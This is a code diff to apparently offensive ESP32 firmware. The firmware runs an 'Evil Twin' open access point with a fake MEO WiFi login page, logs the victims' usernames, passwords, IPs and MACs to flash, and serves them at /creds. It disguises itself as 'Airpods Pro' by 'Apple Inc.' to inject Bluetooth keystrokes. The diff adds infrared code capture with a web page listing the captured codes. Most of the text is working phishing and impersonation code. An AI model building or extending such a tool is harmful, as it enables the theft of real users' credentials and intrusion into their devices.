@@ -8,6 +8,7 @@
 #include <BleKeyboard.h>
 #include <FS.h>
 #include <SPIFFS.h>
+#include <IRremote.h>
 
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
@@ -16,6 +17,7 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
 #define BTN_MODE 18
 #define BTN_ACTION 19
+#define IR_RECV_PIN 15
 #define KEY_SEARCH 0x44
 
 AsyncWebServer server(80);
@@ -42,21 +44,17 @@ const char* ByteCat2[] = {"  /\\_/\\ ", " ( -.- )", "  > ^ < "};
 BleKeyboard bleKeyboard("Airpods Pro", "Apple Inc.", 100);
 
 const char* html_page = R"rawliteral(
-<!DOCTYPE html><html lang="pt">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>MEO WiFi Login</title>
-<style>body{background:#f4f4f4;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-.container{background:white;padding:20px;box-shadow:0 0 10px gray;border-radius:8px}
-h2{color:#003366}input,button{width:100%;padding:10px;margin:10px 0}button{background:#00a1e0;color:white;border:none}</style>
-</head><body><div class="container"><h2>Inicie sessão na rede WiFi MEO</h2>
-<form method="POST" action="/login">
+<!DOCTYPE html><html lang="pt"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>MEO WiFi Login</title><style>body{background:#f4f4f4;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.container{background:white;padding:20px;box-shadow:0 0 10px gray;border-radius:8px}h2{color:#003366}input,button{width:100%;padding:10px;margin:10px 0}button{background:#00a1e0;color:white;border:none}</style>
+</head><body><div class="container"><h2>Inicie sessão na rede WiFi MEO</h2><form method="POST" action="/login">
 <input name="user" placeholder="Nome de utilizador" required>
 <input name="pass" type="password" placeholder="Palavra‑passe" required>
-<button type="submit">Entrar</button>
-</form><div class="note">Ao iniciar sessão, aceita os Termos e Condições.</div></div></body></html>
+<button type="submit">Entrar</button></form>
+<div class="note">Ao iniciar sessão, aceita os Termos e Condições.</div></div></body></html>
 )rawliteral";
 
-// ---------------- UTILITÁRIOS SPIFFS ----------------
+// ---------------- SPIFFS UTILS ----------------
 void appendToFile(const char* path, const String& data) {
   File file = SPIFFS.open(path, FILE_APPEND);
   if (!file) return;
@@ -64,7 +62,7 @@ void appendToFile(const char* path, const String& data) {
   file.close();
 }
 
-// ---------------- INTERFACE E DISPLAY ----------------
+// ---------------- DISPLAY ----------------
 void showMascot(bool blink) {
   display.setTextSize(1);
   display.setCursor(0, 0);
@@ -78,7 +76,6 @@ void showMascot(bool blink) {
 void updateDisplay(String title, String info, int visitors, bool blink) {
   display.clearDisplay();
   showMascot(blink);
-  display.setTextSize(1);
   display.setCursor(0, 32);
   display.println("Modo: " + title);
   display.println("SSID: " + info);
@@ -89,7 +86,6 @@ void updateDisplay(String title, String info, int visitors, bool blink) {
 void showCredsDisplay() {
   display.clearDisplay();
   showMascot(true);
-  display.setTextSize(1);
   display.setCursor(0, 32);
   display.println("Credenciais:");
   if (credsCount > 0) {
@@ -102,6 +98,23 @@ void showCredsDisplay() {
   display.display();
 }
 
+void showIRsOnDisplay() {
+  display.clearDisplay();
+  display.setCursor(0, 0);
+  display.setTextSize(1);
+  display.println("Sinais IR:");
+  File file = SPIFFS.open("/irs.txt", FILE_READ);
+  int y = 10;
+  while (file && file.available() && y < SCREEN_HEIGHT) {
+    display.setCursor(0, y);
+    display.println(file.readStringUntil('\n'));
+    y += 10;
+  }
+  file.close();
+  display.display();
+}
+
+// ---------------- CAPTIVE PORTAL ----------------
 void resetSystem() {
   WiFi.softAPdisconnect(true);
   dnsServer.stop();
@@ -120,19 +133,11 @@ void scanNetworks() {
   }
 }
 
-// ---------------- SPIFFS PAGE ROUTES ----------------
 void setupWebPages() {
   server.on("/creds", HTTP_GET, [](AsyncWebServerRequest *request){
     File file = SPIFFS.open("/creds.txt", FILE_READ);
-    if (!file) {
-      request->send(200, "text/plain", "Nenhum dado disponível.");
-      return;
-    }
-
     String content = "<!DOCTYPE html><html><body><h2>Credenciais</h2><ul>";
-    while (file.available()) {
-      content += "<li>" + file.readStringUntil('\n') + "</li>";
-    }
+    while (file && file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
     content += "</ul></body></html>";
     file.close();
     request->send(200, "text/html", content);
@@ -140,22 +145,23 @@ void setupWebPages() {
 
   server.on("/macs", HTTP_GET, [](AsyncWebServerRequest *request){
     File file = SPIFFS.open("/macs.txt", FILE_READ);
-    if (!file) {
-      request->send(200, "text/plain", "Nenhum MAC disponível.");
-      return;
-    }
-
     String content = "<!DOCTYPE html><html><body><h2>MACs Registrados</h2><ul>";
-    while (file.available()) {
-      content += "<li>" + file.readStringUntil('\n') + "</li>";
-    }
+    while (file && file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
+    content += "</ul></body></html>";
+    file.close();
+    request->send(200, "text/html", content);
+  });
+
+  server.on("/irs", HTTP_GET, [](AsyncWebServerRequest *request){
+    File file = SPIFFS.open("/irs.txt", FILE_READ);
+    String content = "<!DOCTYPE html><html><body><h2>Sinais IR Captados</h2><ul>";
+    while (file && file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
     content += "</ul></body></html>";
     file.close();
     request->send(200, "text/html", content);
   });
 }
 
-// ---------------- CAPTIVE PORTAL ----------------
 void setupCaptive(const char* ssid) {
   WiFi.softAPConfig(apIP, apIP, netMsk);
   WiFi.softAP(ssid, "", 6);
@@ -170,15 +176,10 @@ void setupCaptive(const char* ssid) {
 
   server.on("/login", HTTP_POST, [](AsyncWebServerRequest *r) {
     String u = r->arg("user"), p = r->arg("pass");
-    String clientIP = r->client()->remoteIP().toString();
-    String macStr = WiFi.softAPmacAddress();
-    String entry = "U:" + u + " P:" + p + " IP:" + clientIP + " MAC:" + macStr;
-
-    if (credsCount < 10)
-      capturedCreds[credsCount++] = entry;
-
+    String entry = "U:" + u + " P:" + p + " IP:" + r->client()->remoteIP().toString() + " MAC:" + WiFi.softAPmacAddress();
+    if (credsCount < 10) capturedCreds[credsCount++] = entry;
     appendToFile("/creds.txt", entry);
-    appendToFile("/macs.txt", macStr);
+    appendToFile("/macs.txt", WiFi.softAPmacAddress());
     r->redirect("/");
   });
 
@@ -202,12 +203,7 @@ void stopBLE() {
 void startHIDPayload() {
   WiFi.mode(WIFI_OFF);
   delay(500);
-
-  if (!bleKeyboard.isConnected()) {
-    Serial.println("Aguardando conexão BLE...");
-    return;
-  }
-
+  if (!bleKeyboard.isConnected()) return;
   delay(2000);
   bleKeyboard.write(KEY_MEDIA_WWW_HOME);
   delay(1500);
@@ -224,37 +220,40 @@ void setup() {
   Serial.begin(115200);
   pinMode(BTN_MODE, INPUT_PULLDOWN);
   pinMode(BTN_ACTION, INPUT_PULLDOWN);
-
-  if (!SPIFFS.begin(true)) {
-    Serial.println("Erro ao montar SPIFFS!");
-    while (true);
-  }
-
-  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
-    Serial.println("Falha ao iniciar display!");
-    while (true);
-  }
-
-  display.clearDisplay();
+  if (!SPIFFS.begin(true)) while (true);
+  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) while (true);
   display.setTextColor(WHITE);
-  display.setTextSize(1);
   updateDisplay("Standby", "-", 0, true);
-
   WiFi.mode(WIFI_OFF);
   WiFi.softAPdisconnect(true);
+
+  IrReceiver.begin(IR_RECV_PIN, ENABLE_LED_FEEDBACK);
 }
 
 void loop() {
+  yield();
   bool blink = millis() % 1000 < 500;
   dnsServer.processNextRequest();
+
+  if (IrReceiver.decode()) {
+    unsigned long irCode = IrReceiver.decodedIRData.decodedRawData;
+    String irHex = String(irCode, HEX);
+    appendToFile("/irs.txt", irHex);
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("IR Captado:");
+    display.println(irHex);
+    display.display();
+    delay(1);
+    IrReceiver.resume();
+  }
 
   if (millis() - lastDebounce > debounceDelay) {
     if (digitalRead(BTN_MODE) == HIGH) {
       lastDebounce = millis();
-      mode = (mode + 1) % 6;
+      mode = (mode + 1) % 8;
       resetSystem();
       stopBLE();
-
       switch (mode) {
         case 1:
           currentSSID = (currentSSID + 1) % 4;
@@ -278,6 +277,9 @@ void loop() {
           showCredsDisplay();
           break;
         case 5:
+          showIRsOnDisplay();
+          break;
+        case 6:
           startBLE();
           updateDisplay("Bluetooth HID", "Esperando", 0, blink);
           break;
@@ -293,7 +295,7 @@ void loop() {
         resetSystem();
         setupCaptive(targetSSIDs[selectedTarget].c_str());
         updateDisplay("Evil Twin", targetSSIDs[selectedTarget], visitCount, blink);
-      } else if (mode == 5) {
+      } else if (mode == 6) {
         startHIDPayload();
         updateDisplay("Payload Enviado", "https://github.com/pedrolucas7i", 0, blink);
       } else {
